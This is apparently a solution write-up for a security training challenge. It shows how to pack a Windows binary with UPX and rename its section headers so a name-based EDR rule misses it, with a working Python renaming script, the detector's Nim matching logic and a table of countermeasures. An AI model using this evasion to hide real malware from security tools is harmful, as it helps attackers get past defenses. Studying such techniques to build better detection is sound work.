---
title: "Solution 33: UPX Section Name Rename"
difficulty: medium
category: "Packer & PE Evasion"
---

[Back to Challenge]({{ '/challenges/33-upx-section-rename/' | relative_url }})

## Overview

Pack the binary with UPX (changing its hash to evade Rule 6), then rename the UPX section names to evade Rule 9.

## Solution

```powershell
# Step 1: Pack with UPX (evades Rule 6 hash check)
upx -o packed.exe original.exe

# Step 2: Verify Rule 9 detects UPX sections
# The EDR will alert: "Packed binary detected (UPX): sections [UPX0, UPX1, UPX!]"

# Step 3: Rename sections with a hex editor or script
```

```python
# rename_upx_sections.py
import sys

with open(sys.argv[1], 'rb') as f:
    data = bytearray(f.read())

# Find and replace UPX section names in section headers
# Section headers are 40 bytes each, name is first 8 bytes
replacements = {
    b'UPX0\x00\x00\x00\x00': b'.text\x00\x00\x00',
    b'UPX1\x00\x00\x00\x00': b'.rdata\x00\x00',
    b'UPX!\x00\x00\x00\x00': b'.rsrc\x00\x00\x00',
    b'UPX2\x00\x00\x00\x00': b'.data\x00\x00\x00',
}

for old, new in replacements.items():
    pos = data.find(old)
    while pos != -1:
        data[pos:pos+8] = new
        print(f"  Renamed {old[:4]} -> {new[:5]} at offset {hex(pos)}")
        pos = data.find(old, pos + 8)

with open(sys.argv[1], 'wb') as f:
    f.write(data)

print("Done — UPX section names replaced")
```

```powershell
# Step 4: Apply the rename
python rename_upx_sections.py packed.exe

# Step 5: Run — neither Rule 6 nor Rule 9 triggers
.\packed.exe
```

## Why It Works

The EDR's packer detection is purely name-based:

```nim
const PackerSectionNames = ["UPX0", "UPX1", "UPX2", "UPX!", ...]

for packer in PackerSectionNames:
  if secName == packer:
    result.hasPackerSections = true
```

Renaming `UPX0` to `.text` makes the packed binary indistinguishable from a normal binary to this scanner. The UPX decompression stub still works because it uses offsets, not section names.

**Note**: `upx -d` (decompress) will fail after renaming sections, since UPX uses the section names to locate its metadata. But the binary still executes normally.

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| Entropy analysis | Detects high-entropy (compressed/encrypted) sections |
| Section size ratios | Flags sections where virtual size >> raw size |
| Import table analysis | UPX-packed binaries have minimal imports (only LoadLibrary/GetProcAddress) |
| Signature scanning | Scan for UPX decompression stub byte patterns, not just names |
